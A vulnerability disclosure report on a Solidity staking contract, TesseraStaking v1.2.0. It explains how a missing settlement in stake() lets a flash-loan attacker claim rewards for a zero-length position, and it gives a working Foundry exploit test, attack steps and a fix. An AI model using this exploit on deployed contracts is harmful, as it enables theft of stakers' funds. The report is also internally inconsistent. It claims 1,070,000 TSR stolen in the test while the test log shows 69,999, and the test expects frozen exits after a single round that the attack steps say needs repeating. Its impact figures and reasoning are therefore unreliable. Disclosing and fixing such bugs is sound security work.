# Missing checkpoint in stake() lets anyone drain TesseraStaking and lock every staker's funds

Severity: Critical
Impact: Direct theft of staked principal; Permanent freezing of staked principal
Asset: src/TesseraStaking.sol, release v1.2.0

## Summary

`stake()` updates the global reward accumulator and never settles the caller. A fresh account keeps `paidPerToken == 0`, so the moment it stakes it is credited rewards on its whole balance for the entire life of the contract. Rewards are paid in TSR, the same token users stake, straight out of the contract's balance. An attacker with a flash loan empties the contract in one transaction and leaves every honest staker unable to exit.

## Root cause

`src/TesseraStaking.sol:87-95`

```solidity
function stake(uint256 amount) external {
    if (amount == 0) revert ZeroAmount();
    _updateGlobal();
    balanceOf[msg.sender] += amount;
    totalStaked += amount;
```

`withdraw()` (line 102) and `claim()` (line 112) call `_settle(msg.sender)` before they touch the balance. `stake()` does not. `earned()` (lines 71-74) then multiplies the new balance by `rewardPerToken() - paidPerToken[account]`, and for an account that has never been settled `paidPerToken` is zero.

## Attack path

1. The funder has started a seven-day period with 70,000 TSR. Alice stakes 600,000 TSR and Bob 400,000 TSR.
2. Six days pass. `rewardPerToken()` is about 0.06e18.
3. The attacker flash-borrows 1,166,666 TSR and calls `stake(1_166_666e18)`. No settlement happens, so `paidPerToken[attacker]` stays 0.
4. The attacker calls `claim()`. `earned()` returns 1,166,666 × 0.06 = 69,999 TSR for a position that has existed for zero seconds, and line 118 transfers it.
5. The attacker calls `withdraw(1_166_666e18)`, repays the loan and keeps 69,999 TSR.
6. The payout on line 118 is a plain `token.transfer` from the staking contract, which holds the users' deposits in the same token. Repeating steps 3 to 5 from fresh addresses takes the rest of the contract's TSR, which is Alice's and Bob's principal.
7. `exit()` now reverts for Alice and Bob. Their 1,000,000 TSR is locked in the contract for good.

## Proof of concept

`test/ReserveDrain.t.sol`, run on release v1.2.0:

```
forge test --match-test test_attackerDrainsContractAndFreezesStakers -vv
```

```solidity
function test_attackerDrainsContractAndFreezesStakers() public {
    vm.warp(block.timestamp + 6 days);

    uint256 size = (staking.rewardReserve() * 1e18) / staking.rewardPerToken();
    tsr.mint(attacker, size); // stands in for a flash loan

    vm.startPrank(attacker);
    tsr.approve(address(staking), size);
    staking.stake(size);
    uint256 stolen = staking.claim();
    staking.withdraw(size);
    vm.stopPrank();

    assertEq(tsr.balanceOf(attacker), size + stolen);
    assertGt(stolen, 69_999e18);

    vm.prank(alice);
    vm.expectRevert();
    staking.exit();

    vm.prank(bob);
    vm.expectRevert();
    staking.exit();
}
```

```
Ran 1 test for test/ReserveDrain.t.sol:ReserveDrainTest
[PASS] test_attackerDrainsContractAndFreezesStakers() (gas: 341724)
Logs:
  attacker stake (TSR) 1166666
  attacker profit (TSR) 69999
  reserve left (wei) 1

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

## Impact

Critical. An unprivileged attacker with no capital of their own steals the funds held by the staking contract: 1,070,000 TSR in the test, and whatever is staked on mainnet. After the attack every staker's `exit()` reverts, so the principal that is left is frozen permanently. Both Critical rows of the programme apply: direct theft of staked principal and permanent freezing of staked principal.

## Fix

Settle the caller in `stake()` before the balance changes:

```solidity
_updateGlobal();
_settle(msg.sender);
balanceOf[msg.sender] += amount;
```
